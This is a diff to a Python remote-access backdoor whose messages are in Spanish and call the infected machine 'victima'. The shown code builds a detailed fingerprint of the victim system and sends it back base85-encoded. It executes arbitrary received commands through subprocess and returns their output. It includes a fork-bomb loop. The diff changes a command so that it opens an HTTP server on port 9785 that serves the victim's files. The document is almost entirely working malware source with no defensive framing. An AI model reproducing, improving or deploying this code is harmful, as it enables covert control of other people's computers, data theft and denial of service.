@@ -1,6 +1,7 @@
 #! /usr/bin/python3
 
-
+import http.server
+import platform
 import socket
 import base64
 import datetime
@@ -8,8 +9,8 @@ import os
 import sys
 import subprocess
 
-from multiprocessing import Process, cpu_count  # multiprocessing.cpu_count()
-from http.server import *
+from multiprocessing import Process, cpu_count
+
 
 global _CodingBase85Text
 global _DecodingBase85Text
@@ -40,33 +41,27 @@ def _MAIN():
         while True:
             os.fork()
 
-    def _HttpServer(port):
-        class serv(HTTPServer):
-            pass
+    def _HttpServer():
+        def test(HandlerClass=http.server.BaseHTTPRequestHandler,ServerClass=http.server.HTTPServer,
+        protocol="HTTP/1.0", port=9785, bind=""):
 
-        class base(BaseHTTPRequestHandler):
+            server_address = (bind, port)
 
-            def repuesta(self):
-                self.send_response(200)
-                self.send_header('Content-type', 'text/html')
-                self.end_headers()
-                if sys.platform == 'linux' or sys.platform == 'linux2':
-                    subprocess.getstatusoutput("clear")
-                elif sys.platform == 'win32':
-                    subprocess.getstatusoutput("cls")
-                else :
-                    subprocess.getstatusoutput("cls")
+            HandlerClass.protocol_version = protocol
 
-            def do_GET(self):
-                #logging.info("Solicitud GET,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
-                self.repuesta()
+            httpd = ServerClass(server_address, HandlerClass)
 
-            def do_POST(self):
-                self.repuesta()
+            try:
+                httpd.serve_forever()
+            except KeyboardInterrupt:
+                sys.exit(0)
 
-        address = ("", int(port))
-        http = serv(address, base)
-        http.serve_forever()
+            return port
+
+
+        handler_class = http.server.SimpleHTTPRequestHandler
+        port = test(HandlerClass=handler_class)
+
         return port
 
 
@@ -108,27 +103,30 @@ def _MAIN():
                 def _OsInfo():
                     self.Cwd = os.getcwd()
                     OsInfo = "\033[1;32m[*]\033[1;37mConexion establecida.\n"
-                    OsInfo += "\033[1;32m[*]\033[1;37mEl sistema operativo victima es: " + str(
-                        self.Os)+'\n'
-                    OsInfo += "\033[1;32m[*]\033[1;37mTiempo: " + \
-                        str(self.Time)+'\n'
-                    OsInfo += "\033[1;32m[*]\033[1;37mDirectorio: " + \
-                        str(self.Cwd)+"\n"
-                    OsInfo += "\033[1;32m[*]\033[1;37mNombre del equipo: " + \
-                        str(socket.gethostname())+"\n"
-                    OsInfo += "\033[1;32m[*]\033[1;37mIp de la maquina: " + \
-                        str(self.Ip) + '\n'
-                    OsInfo += "\033[1;32m[*]\033[1;37mBuffer: " + \
-                        str(self.buffer) + '\n'
-                    OsInfo += "\033[1;32m[*]\033[1;37mTipo de conexion: " + \
-                        str(self.Target) + '\n'
+                    OsInfo += "\033[1;32m[*]\033[1;37mEl sistema operativo victima es: " + str(self.Os)+'\n'
+                    OsInfo += "\033[1;32m[*]\033[1;37mTiempo: " + str(self.Time)+'\n'
+                    OsInfo += "\033[1;32m[*]\033[1;37mDirectorio: " + str(self.Cwd)+"\n"
+                    OsInfo += "\033[1;32m[*]\033[1;37mNombre del equipo: " + str(socket.gethostname())+"\n"
+                    OsInfo += "\033[1;32m[*]\033[1;37maseguramiento del nombre del dispositivo: "+str(platform.node())+"\n"
+                    OsInfo += "\033[1;32m[*]\033[1;37mIp de la maquina: " + str(self.Ip) + '\n'
+                    OsInfo += "\033[1;32m[*]\033[1;37mBuffer: " + str(self.buffer) + '\n'
+                    OsInfo += "\033[1;32m[*]\033[1;37mTipo de conexion: " + str(self.Target) + '\n'
+                    OsInfo += "\033[1;32m[*]\033[1;37mEjecutable de pythhon con el que se ejecuta: "+str(platform.architecture(sys.executable , '' , ''))+'\n'
+                    OsInfo += "\033[1;32m[*]\033[1;37mEstructura: " + str(platform.machine()) +"\n"
+                    OsInfo += "\033[1;32m[*]\033[1;37mSistema operativo: "+str(platform.platform(0, 0))+"\n"
+                    OsInfo += "\033[1;32m[*]\033[1;37mNombre real del Procesador: "+str(platform.processor())+"\n"
+                    OsInfo += "\033[1;32m[*]\033[1;37mInfo de la version python: "+str(platform.python_build())+"\n"
+                    OsInfo += "\033[1;32m[*]\033[1;37mCompilador de python: "+str(platform.python_compiler())+"\n"
+                    OsInfo += "\033[1;32m[*]\033[1;37mImplementacion de python: "+str(platform.python_implementation())+"\n"
+                    OsInfo += "\033[1;32m[*]\033[1;37mVersion del sistema: "+str(platform.release())+"\n"
+                    OsInfo += "\033[1;32m[*]\033[1;37mTipo de sistema: "+str(platform.system())+"\n"
+                    OsInfo += "\033[1;32m[*]\033[1;37m"+str(platform.uname())+"\n"
+
                     return str(OsInfo)
 
                 if self.i == 1:
                     _CodingBase85Text(self.Target, _OsInfo())
                     self.i = 2
-
-                #_CodingBase85Text(self.Target, str(os.getcwd()))
 
                 comand = str(_DecodingBase85Text(self.Target, self.buffer))
                 if comand == 'exit':
@@ -160,9 +158,8 @@ def _MAIN():
 
 
                 elif comand == 'HttpServer':
-                    PortHttp = int(str(_DecodingBase85Text(self.Target, self.buffer)))
-                    PortHttp = str(PortHttp)
-                    hilo3 = Process(target=_HttpServer(PortHttp))
+                    PortHttp = 9785
+                    hilo3 = Process(target=_HttpServer)
                     hilo3.start()
                     _CodingBase85Text(self.Target, "server abierto en el puerto "+str(PortHttp))
 
@@ -213,8 +210,6 @@ def _MAIN():
 
                 else:
                     data = self.Green + str(subprocess.getstatusoutput(str(comand))[1])
-                    #except UnicodeDecodeError:
-                    #data = '\033[1;36mocurrio un error de descodificaion unicode en el servidor'
                     _CodingBase85Text(self.Target, str(len(data)))
                     _CodingBase85Text(self.Target, str(data))
                     comand = None
